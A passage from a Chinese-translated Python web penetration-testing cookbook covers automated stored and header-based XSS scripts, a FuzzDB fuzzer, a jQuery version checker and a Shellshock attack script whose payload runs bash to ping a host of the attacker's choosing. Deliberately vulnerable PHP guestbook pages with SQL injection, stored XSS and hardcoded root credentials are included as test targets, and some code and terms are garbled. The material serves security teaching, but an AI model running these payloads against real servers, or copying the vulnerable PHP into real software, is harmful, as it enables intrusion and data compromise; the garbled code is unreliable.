跨站脚本攻击非常简单，非常容易自动化和检测，因为攻击字符串通常与结果相同。与目录遍历或 SQLi（稍后我们将遇到）的困难在于结果并不总是可预测的。而在成功的跨站脚本攻击中，它是可预测的。

## 还有更多…

这种攻击可以通过提供更多的攻击字符串来扩展。许多示例可以在 Mozilla FuzzDB 中找到，我们将在*自动模糊*部分脚本中使用。此外，可以使用原始的`urllib`库应用各种编码形式，这在本书的各种不同示例中都有展示。

# 自动参数化跨站脚本

我已经说过跨站脚本非常容易。有趣的是，以脚本方式执行存储的跨站脚本略微困难。我可能应该在这一点上收回我先前的话，但无论如何。这里的困难在于系统通常从一个页面接受输入结构，提交到另一个页面，并返回第三个页面。以下脚本旨在处理这种最复杂的结构。

我们将创建一个脚本，它接受三个输入值，正确读取并提交所有三个值，并检查是否成功。它与之前基于 URL 的跨站脚本共享代码，但在执行上有根本的不同。

## 如何操作…

以下脚本是功能测试。这是一个脚本，旨在在类似 Sublime Text 或 IDE 的框架中手动编辑，因为存储的 XSS 可能需要调整：

```py
import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
initial = requests.get(url)
for payload in payloads:
  d = {}
  for field in BeautifulSoup(initial.text, parse_only=SoupStrainer('input')):
          if field.has_attr('name'):
            if field['name'].lower() == "submit":
              d[field['name']] = "submit"
            else:
              d[field['name']] = payload
  req = requests.post(url2, data=d)
  checkresult = requests.get(url3)

  if payload in checkresult.text:
    print "Full string returned"
    print "Attack string: "+ payload
```

以下是使用此脚本时产生的输出示例，其中包含两个成功的字符串：

```py
Full string returned
Attack string: <script>alert(1);</script>
Full string returned
Attack string: <BODY ONLOAD=alert(1)>
```

## 它是如何工作的…

我们导入我们的库作为时间和时间之前，并建立我们要攻击的 URL。在这里，`url`是带有要攻击的参数的页面，`url2`是要提交内容的页面，`url3`是要读取的最终页面，以便检测攻击是否成功。其中一些 URL 可能是共享的。它们以这种形式设置，因为很难为存储的跨站脚本制作点对点脚本：

```py
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
```

然后，我们建立一个负载列表。与基于 URL 的 XSS 脚本一样，负载和检查值是相同的：

```py
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
```

然后，我们创建一个空字典，将负载与每个识别的输入框配对：

```py
d = {}
```

我们的目标是攻击页面中的每个输入参数，因此接下来，我们读取我们的目标页面：

```py
initial = requests.get(url)
```

然后，我们为我们在负载列表中放置的每个值创建一个循环：

```py
for payload in payloads:
```

然后，我们使用`BeautifulSoup`处理页面，这是一个允许我们根据标签和定义特征来切割页面的库。我们使用它来识别每个输入字段，以便选择名称，以便我们可以发送内容：

```py
for field in BeautifulSoup(initial.text, parse_only=SoupStrainer('input')):
          if field.has_attr('name'):
```

由于大多数网页中输入框的性质，任何名为`submit`的字段都不应被用于跨站脚本攻击，而是需要给予`submit`作为值，以便我们的攻击成功。我们创建一个`if`函数来检测是否是这种情况，使用`.lower()`函数轻松地考虑可能使用的大写值。如果该字段不用于验证提交，我们将其填充为当前使用的负载：

```py
if field['name'].lower() == "submit":
              d[field['name']] = "submit"
            else:
              d[field['name']] = payload
```

我们通过使用`requests`库将我们现在分配的值发送到目标页面的 post 请求中，就像我们之前做的那样：

```py
req = requests.post(url2, data=d)
```

然后加载将呈现我们内容的页面，并准备好用于检查结果函数：

```py
checkresult = requests.get(url3)
```

与之前的脚本类似，我们通过搜索页面上的字符串来检查我们的字符串是否成功，并在成功时打印结果。然后，我们为下一个负载重置字典：

```py
if payload in checkresult.text:
    print "Full string returned"
    print "Attack string: "+ payload
  d = {}
```

## 还有更多…

与之前一样，您可以修改此脚本以包含许多结果或从包含多个值的文件中读取。正如下面的示例中所示，Mozilla 的 FuzzDB 包含大量这些值。

以下是可以用来测试前面部分提供的脚本的设置。它们需要保存为提供的文件名才能正常工作，并与 MySQL 数据库一起使用以存储评论。

以下是名为`guestbook.php`的第一个接口页面：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid'])){
  setcookie("sessionid", $my_rand, "10000000000", "/xss/easy/");}
?>

<form id="contact_form" action='addguestbook.php' method="post">
  <label>Name: <input class="textfield" name="name" type="text" value="" /></label>
  <label>Comment: <input class="textfield" name="comment" type="text" value="" /></label>
  <input type="submit" name="Submit" value="Submit"/> 
</form>

<strong><a href="viewguestbook.php">View Guestbook</a></strong>
```

以下脚本是`addguestbook.php`，它将您的评论放入数据库中：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid'])){
  setcookie("sessionid", $my_rand, "10000000000", "/xss/easy/");}

$host='localhost';
$username='root';
$password='password';
$db_name="xss";
$tbl_name="guestbook";

$cookie = $_COOKIE['sessionid'];

$name = $_REQUEST['name'];
$comment = $_REQUEST['comment'];

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="INSERT INTO $tbl_name VALUES('0','$name', '$comment', '$cookie')";

$result=mysql_query($sql);

if($result){
  echo "Successful";
  echo "<BR>";
  echo "<h1>Hi</h1>";

echo "<a href='viewguestbook.php'>View Guestbook</a>";
}

else{
  echo "ERROR";
}
mysql_close();
?>
```

最终脚本是`viewguestbook.php`，它从数据库中获取评论：

```py
<html>

<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>

<h1>Comments</h1>

<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid'])){
  setcookie("sessionid", $my_rand, "10000000000", "/xss/easy/");}

$host='localhost';
$username='root';
$password='password';
$db_name="xss";
$tbl_name="guestbook";

$cookie = $_COOKIE['sessionid'];

$name = $_REQUEST['name'];
$comment = $_REQUEST['comment'];

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="SELECT * FROM guestbook WHERE session = '$cookie'";";

$result=mysql_query($sql);

while($field = mysql_fetch_assoc($result)) {

  print "Name: " . $field['name'] . "\t";
  print "Comment: " . $field['comment'] . "<BR>\r\n";
}

mysql_close();
?>
```

# 自动模糊

Fuzzing 是黑客社区的破坏和抢劫。它侧重于向页面发送大量无效内容并记录结果。这是 SQL 注入的败类版本，可以说是渗透测试的基本形式（尽管你们 LOIC 用户可能是生命形式的基本形式）。

我们将创建一个脚本，它将从 FuzzDB 元字符文件中获取值，并将它们发送到每个可用的参数，并记录所有结果。这绝对是一种暴力尝试来识别漏洞，并需要一个明智的人来查看结果。

## 准备工作

为此，您将需要来自 Mozilla 的 FuzzDB。在印刷时，可以从[`code.google.com/p/fuzzdb/`](https://code.google.com/p/fuzzdb/)获取。对于此脚本，您需要`fuzzdb` TAR 文件中的`/fuzzdb-1.09/attack-payloads/all-attacks/interesting-metacharacters.txt`文件。我正在重用用于概念验证的 XSS 脚本的测试 PHP 脚本，但您可以针对任何您喜欢的内容使用此脚本。目标是触发错误。

## 如何做…

脚本如下：

```py
import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"

f =  open("/home/cam/Downloads/fuzzdb-1.09/attack-payloads/all- attacks/interesting-metacharacters.txt")
o = open("results.txt", 'a')

print "Fuzzing begins!"

initial = requests.get(url)
for payload in f.readlines():
  for field in BeautifulSoup(initial.text,  parse_only=SoupStrainer('input')):
  d = {}

          if field.has_attr('name'):
            if field['name'].lower() == "submit":
             d[field['name']] = "submit"
            else:
             d[field['name']] = payload
  req = requests.post(url2, data=d)
  response = requests.get(url3)

  o.write("Payload: "+ payload +"\r\n")
  o.write(response.text+"\r\n")

print "Fuzzing has ended"
```

以下是使用此脚本时产生的输出示例：

```py
Fuzzing has begun!
Fuzzing has ended
```

## 它是如何工作的…

我们导入我们的库。由于这是一个测试脚本，我们在代码中建立我们的 URL：

```py
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
```

然后我们打开两个文件。第一个将是 FuzzDB 元字符文件。我包含了我的路径，但在您的工作目录中复制该文件也是可以接受的。第二个文件将是您要写入的文件：

```py
f =  open("/home/cam/Downloads/fuzzdb-1.09/attack-payloads/all-attacks/interesting-metacharacters.txt")
o = open("results.txt", 'a')
```

我们创建一个空字典，用于存储我们的参数和攻击字符串：

```py
d = {}
```

由于脚本将其输出写入文件，我们需要提供一些文本来显示脚本正在运行，因此我们写了一条简单而友好的消息：

```py
print "Fuzzing begins!"
```

我们读取接受输入的原始页面并赋给一个变量：

```py
initial = requests.get(url)
```

我们使用`BeautifilSoup`分离页面并识别我们想要的唯一字段，即输入字段和名称字段：

```py
for field in BeautifulSoup(initial.text, parse_only=SoupStrainer('input')):
          if field.has_attr('name')@~:
```

我们需要再次检查是否提供了名为 submit 的字段，并将`submit`作为数据，否则我们应用我们的攻击字符串：

```py
if field['name'].lower() == "submit":
              d[field['name']] = "submit"
            else:
              d[field['name']] = payload
```

我们首先提交一个`POST`请求，发送攻击字符串映射到输入字段的字典，然后我们从显示输出的页面请求一个`GET`请求（在第三页之前可能会出现一些错误，因此您应该相应地进行限制）：

```py
req = requests.post(url2, data=d)
  response = requests.get(url3)
```

由于输出会很长而且混乱，我们将输出写入最初打开的文件，以便人类可以轻松审查：

```py
o.write("Payload: "+ payload +"\r\n")
o.write(response.text+"\r\n")
```

我们重置字典以供下一个攻击字符串使用，然后为了清晰起见，向用户提供脚本结束的输出：

```py
d = {}
print "Fuzzing has ended"
```

## 还有更多…

您可以不断添加内容到这个脚本中。它被设计为适用于多种类型的输入和攻击。FuzzDB 包含许多不同的攻击字符串，因此所有这些都可以应用。我鼓励您去探索。

## 另请参阅

您可以像我一样针对存储的 XSS PHP 页面进行测试。

# jQuery 检查

OWASP 十大漏洞中较少被检查但更严重的一个是使用已知漏洞的库或模块。这通常意味着过时的 web 框架版本，但也包括执行特定功能的 JavaScript 库。在这种情况下，我们正在检查 jQuery；我已经用这个脚本检查了其他库，但为了举例，我将坚持使用 jQuery。

我们将创建一个脚本，用于识别网站是否使用 jQuery，获取其版本号，然后将其与最新版本号进行比较，以确定是否为最新版本。

## 如何做…

以下是我们的脚本：

```py
import requests
import re
from bs4 import BeautifulSoup
import sys

scripts = []

if len(sys.argv) != 2:
  print "usage: %s url" % (sys.argv[0])
  sys.exit(0)

tarurl = sys.argv[1]
url = requests.get(tarurl)
soup = BeautifulSoup(url.text)
for line in soup.find_all('script'):
  newline = line.get('src')
  scripts.append(newline)

for script in scripts:
  if "jquery.min" in str(script).lower():
    url = requests.get(script)
    versions = re.findall(r'\d[0-9a-zA-Z._:-]+',url.text)
    if versions[0] == "2.1.1" or versions[0] == "1.12.1":
      print "Up to date"
    else:
      print "Out of date"
      print "Version detected: "+versions[0]
```

以下是使用此脚本时产生的输出示例：

```py
http://candycrate.com
Out of Date
Version detected: 1.4.2
```

## 它是如何工作的…

像往常一样，我们导入我们的库并创建一个空库，用于存放我们未来识别的脚本：

```py
scripts = []
```

对于这个脚本，我们创建了一个简单的使用指南，用于检测是否已提供 URL。它读取`sys.argv`的数量，如果不等于`2`，包括脚本本身，则打印出指南：

```py
if len(sys.argv) != 2:
  print "usage: %s url" % (sys.argv[0])
  sys.exit(0)
```

我们从`sys.argv`列表中获取目标 URL 并打开它：

```py
tarurl = sys.argv[1]
url = requests.get(tarurl)
```

与之前一样，我们使用 beautiful soup 来拆分页面；但是，这次我们正在识别脚本并提取它们的`src`值，以获取正在使用的`js`库的 URL。这将收集所有可能是 jQuery 的潜在库。请记住，如果您扩展使用范围以包括不同类型的库，这个 URL 列表可能非常有用：

```py
for line in soup.find_all('script'):
  newline = line.get('src')
  scripts.append(newline)
```

对于每个识别的脚本，我们然后检查是否有任何`jquery.min`的提及，这将指示核心 jQuery 文件：

```py
for script in scripts:
  if "jquery.min" in str(script).lower():
```

然后我们使用正则表达式来识别版本号。在 jQuery 文件中，这将是符合给定正则表达式的第一件事。正则表达式寻找`0-9`或`a-z`后跟一个无限次数重复的句点。这是大多数版本号采用的格式，jQuery 也不例外：

```py
versions = re.findall(r'\d[0-9a-zA-Z._:-]+',url.text)
```

`re.findall`方法找到与此正则表达式匹配的所有字符串；但是，正如前面提到的，我们只想要第一个。我们用注释`[0]`来标识它。我们检查是否等于当前 jQuery 版本的硬编码值，在撰写时。这些将需要手动更新。如果该值等于当前版本中的任何一个，脚本将声明其为最新版本，否则，它将打印检测到的版本以及过期消息：

```py
if versions[0] == "2.1.1" or versions[0] == "1.12.1":
      print "Up to date"
    else:
      print "Out of date"
      print "Version detected: "+versions[0]
```

## 还有更多…

这个配方显然是可扩展的，可以通过简单地添加检测字符串和版本来应用到任何 JavaScript 库。

如果要扩展该字符串以包括其他库，比如不安全的 Django 或 flask 库，脚本将不得不进行修改，以处理它们声明的替代方式，因为它们显然不是声明为 JavaScript 库。

# 基于标头的跨站脚本

到目前为止，我们已经专注于通过 URL 和参数发送有效载荷，这是执行攻击的两种明显方法。然而，通常有许多丰富和肥沃的漏洞来源往往被忽视。其中之一将在第六章中深入介绍，*图像分析和操作*，现在我们可以先简单介绍一下。通常会记录访问网页的用户的特定标头。通过在标头中执行 XSS 攻击来执行这些日志的检查可能是一项值得的活动。

我们将创建一个脚本，向所有可用的标头提交 XSS 攻击字符串，并循环执行几种可能的 XSS 攻击。我们将提供一个简短的有效载荷列表，抓取所有标头，并依次提交它们。

## 准备工作

识别您希望测试的 URL。请参见本示例末尾的 PHP 网页，脚本可以用来测试脚本的有效性。

## 如何做…

一旦您确定了目标网页，将其作为命令行参数传递给脚本。您的脚本应该与下面的脚本中所示的相同：

```py
import requests
import sys
url = sys.argv[1]
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY  ONLOAD=alert(1)>']
headers ={}
r = requests.head(url)
for payload in payloads:
  for header in r.headers:
    headers[header] = payload
  req = requests.post(url, headers=headers)
```

脚本不会提供任何输出，因为它针对的是功能的管理员端。但是，您可以轻松地设置它在每个循环中提供输出：

```py
Print "Submitted "+payload
```

这将每次返回以下内容：

```py
Submitted <script>alert(1);</script>
```

## 工作原理…

我们导入我们脚本所需的库，并以`sys.argv`函数的形式输入。你应该对这一点相当熟悉了。

再次，我们可以将我们的有效载荷声明为列表，而不是字典，因为我们将它们与网页提供的值配对。我们还创建一个空字典来容纳我们未来的攻击配对：

```py
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
headers ={}
```

然后，我们对网页进行`HEAD`请求，仅返回我们正在攻击的页面的标头。虽然`HEAD`请求可能被禁用，但这种可能性很小；但是，如果是这样，我们可以将其替换为标准的`GET`请求：

```py
r = requests.head(url)
```

我们循环遍历之前设置的有效载荷和从前面的`HEAD`请求中提取的标头：

```py
for payload in payloads:
  for header in r.headers:
```

对于每个有效载荷和标头，我们将它们添加到之前设置的空字典中，作为一对：

```py
headers[header] = payload
```

对于每个有效载荷的迭代，我们然后提交所有具有该有效载荷的标头，因为显然我们无法提交每个标头的多个：

```py
req = requests.post(url, headers=headers)
```

由于攻击的活动部分发生在管理员的客户端，因此需要使用管理员帐户手动检查，或者需要联系管理员以查看攻击是否在日志链的任何位置激活。

## 另请参阅

以下是可用于测试前面脚本的设置。这与用于 XSS 检查的早期脚本非常相似。这里的区别在于传统的 XSS 方法将由于`strip_tags`函数而失败。它演示了需要使用非常规方法执行攻击的情况。显然，在注释中返回用户代理是虚构的，尽管这在野外很常见。它们需要保存为提供的文件名以便与 MySQL 数据库一起工作，并存储评论。

以下是名为`guestbook.php`的第一个界面页面：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid4'])){
  setcookie("sessionid4", $my_rand, "10000000000", "/xss/vhard/");
}
?>

<form id="contact_form" action='addguestbook.php' method="post">
  <label>Name: <input class="textfield" name="name" type="text" value="" /></label>
  <label>Comment: <input class="textfield" name="comment" type="text" value="" /></label>
  <input type="submit" name="Submit" value="Submit"/> 
</form>

<strong><a href="viewguestbook.php">View Guestbook</a></strong>
```

以下脚本是`addguestbook.php`，它将您的评论放入数据库：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid4'])){
  setcookie("sessionid4", $my_rand, "10000000000", "/xss/vhard/");
}

$host='localhost';
$username='root';
$password='password';
$db_name="xss";
$tbl_name="guestbook";

$cookie = $_COOKIE['sessionid4'];

$unsanname = $_REQUEST['name'];
$unsan = $_REQUEST['comment'];
$comment = addslashes($unsan);
$name = addslashes($unsanname);

#echo "$comment";

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="INSERT INTO $tbl_name VALUES('0','$name', '$comment', '$cookie')";

$result=mysql_query($sql);

if($result){
  echo "Successful";
  echo "<BR>";

echo "<a href='viewguestbook.php'>View Guestbook</a>";
}

else{
  echo "ERROR";
}
mysql_close();
?>
```

最终脚本是`viewguestbook.php`，它从数据库中提取评论：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid4'])){
  setcookie("sessionid4", $my_rand, "10000000000", "/xss/vhard/");
}

$host='localhost';
$username='root';
$password='password';
$db_name="xss";
$tbl_name="guestbook";

$cookie = $_COOKIE['sessionid4'];

$name = $_REQUEST['name'];
$comment = $_REQUEST['comment'];

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="SELECT * FROM guestbook WHERE session = '$cookie'";

$result=mysql_query($sql);

echo "<h1>Comments</h1>\r\n";

while($field = mysql_fetch_assoc($result)) {
  $trimmedname = strip_tags($field['name']);
  $trimmedcomment = strip_tags($field['comment']);
  echo "<a>Name: " . $trimmedname . "\t";
  echo "Comment: " . $trimmedcomment . "</a><BR>\r\n";
  }

echo "<!--" . $_SERVER['HTTP_USER_AGENT'] . "-->";

mysql_close();
?>
```

# Shellshock 检查

摆脱对 Web 服务器的标准攻击方式，我们将快速查看 Shellshock，这是一个漏洞，允许攻击者通过特定标头执行 shell 命令。这个漏洞在 2014 年出现，并迅速成为当年最大的漏洞之一。虽然现在它大部分已经修复，但它是 Web 服务器可以被操纵执行更复杂攻击的一个很好的例子，并且可能在未来的**常见传输文件**（CTF）中成为频繁的目标。

我们将创建一个脚本，该脚本会拉取页面的标头，识别易受攻击的标头是否存在，并向该标头提交一个示例有效载荷。此脚本依赖于外部基础设施来支持此攻击以收集受损设备的呼叫。

## 准备工作

确定您要测试的 URL。一旦确定了目标网页，将其作为`sys.argv`传递给脚本：

## 如何做…

您的脚本应该与以下脚本相同：

```py
import requests
import sys
url = sys.argv[1]
payload = "() { :; }; /bin/bash -c 'ping –c 1 –p pwnt <url/ip>'"
headers ={}
r = requests.head(url)
for header in r.headers:
  if header == "referer" or header == "User-Agent": 
    headers[header] = payload
req = requests.post(url, headers=headers)
```

该脚本不会提供输出，因为它针对的是功能的管理员端。但是，您可以轻松地设置它在每次循环时提供输出：

```py
Print "Submitted "+payload
```

这将每次返回以下内容：

```py
Submitted <script>alert(1);</script>
```

## 它是如何工作的…

我们导入了此脚本所需的库，并以`sys.argv`函数的形式接受输入。这有点重复，但它完成了工作。

我们将我们的有效载荷声明为一个单一实体。如果您希望对服务器执行多个操作，可以将其设置为有效载荷，类似于前面的操作。我们还为我们的标头-有效载荷组合创建一个空字典，并向目标 URL 发出`HEAD`请求：

```py
payload = "() { :; }; /bin/bash -c 'ping –c 1 –p pwnt <url/ip>'"
headers ={}
r = requests.head(url)
```

此处设置的有效载荷将 ping 您在`<url/ip>`空间设置的任何服务器。它将在该 ping 中发送一条消息，即`pwnt`。这使您能够确定服务器实际上已被攻破，而不仅仅是一个随机服务器。

然后，我们遍历我们在初始的`HEAD`请求中提取的每个标头，并检查是否有`referrer`或`User-Agent`标头，这些标头容易受到 Shellshock 攻击。如果存在这些标头，我们对该标头发送我们的攻击字符串：

```py
for header in r.headers:
  if header == "referer" or header == "User-Agent": 
    headers[header] = payload
```

一旦我们确定了我们的标头是否存在，并已设置了针对它们的攻击字符串，我们就发出请求。如果成功，消息应该出现在我们的日志中：

```py
req = requests.post(url, headers=headers)
```
